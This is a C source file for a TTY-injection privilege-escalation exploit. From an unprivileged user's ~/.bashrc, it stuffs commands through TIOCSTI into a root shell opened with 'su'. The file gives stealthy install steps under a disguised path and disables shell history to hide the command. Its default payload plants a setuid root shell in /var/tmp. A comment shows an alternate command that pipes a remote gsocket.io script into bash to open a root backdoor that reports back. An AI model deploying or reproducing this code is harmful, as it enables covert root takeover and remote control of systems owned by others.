// Alice gets ROOT when ROOT uses 'su alice' to switch to Alice.
// (This is the older trick in the book - TTY / TIOCSTI stuffing)
//
// 'Alice' is a synonym for any unprivileged user. Useful when you have
// shell access to 'apache', 'php', 'postgresql', or 'nobody' and need to
// gain root without LPE exploit.
// 
// Install/Deploy:
// ---------------
// mkdir -p ~/.config/procps 2>/dev/null
// gcc -Wall -o ~/.config/procps/reset ttyinject.c && strip ~/.config/procps/reset
//
// Add this to the Alice's ~/.bashrc 
//    ~/.config/procps/reset 2>/dev/null
//
// Then wait for ROOT to 'su Alice' and find a +s root shell at /var/tmp/.socket
//
// For the elite only:
// -------------------
// It is possible to specify a different command via command line options.
// Example of Alice's ~/.bashrc to start gs-netcat as ROOT (and report back to us):
//    ~/.config/procps/ti 'GS_WEBHOOK_KEY=63a053ac-f921-419d-8cfe-ff703cacd39a bash -c "$(curl -fsSL https://gsocket.io/y)"'

#include <sys/ioctl.h>
#include <sys/stat.h>
#include <signal.h>
#include <termios.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

// 1. Bash echos any input back to user. Close STDERR to stop this.
// 2. Disable history so CMD does not show in user's history.
// 3. Pipe CMD into bash's input (the 'prompt') and start CMD as background process.
// 4. Last re-open STDERR again and let 'su' come back to foreground..
#define START "exec 2>&-\nset +o history\n({ "
#define CMD "cp /bin/sh /var/tmp/.socket; chmod 4777 /var/tmp/.socket"
#define END ";}>/dev/null 2>/dev/null &);exec 2>&0;fg\n"

int
main(int argc, char *argv[]) {
    pid_t ppid;
    char *ptr;

    if ((getuid() == 0) || (!isatty(STDIN_FILENO)))
        exit(0);

    if ((ppid = getppid()) <= 1)
        exit(0);

    struct stat s;
    if ((ptr = ttyname(STDIN_FILENO)) == NULL)
        exit(0);
    if (stat(ptr, &s) != 0)
        exit(0);
    if (s.st_uid == getuid())
        exit(0); // TTY has same UID as us.

    // suspend parent to background so that string goes into shell.
    if (kill(ppid, SIGSTOP) != 0)
        exit(0);

    // Give parent's shell enough time to be ready for input.
    usleep(100 * 1000);

    for (ptr = START; *ptr != '\0'; ptr++)
        ioctl(STDIN_FILENO, TIOCSTI, ptr);

    ptr = CMD;
    if ((argc > 1) && (*argv[1] != '\0'))
        ptr = argv[1];
    for (; *ptr != '\0'; ptr++)
        ioctl(STDIN_FILENO, TIOCSTI, ptr);

    for (ptr = END; *ptr != '\0'; ptr++)
        ioctl(STDIN_FILENO, TIOCSTI, ptr);

    // Clear the messed up terminal.
    printf("\033[4A\033[J");
    // Give 'fg' enough time to execute before taking back control.
    usleep(100 * 1000);

    kill(ppid, SIGCONT);

    exit(0);
}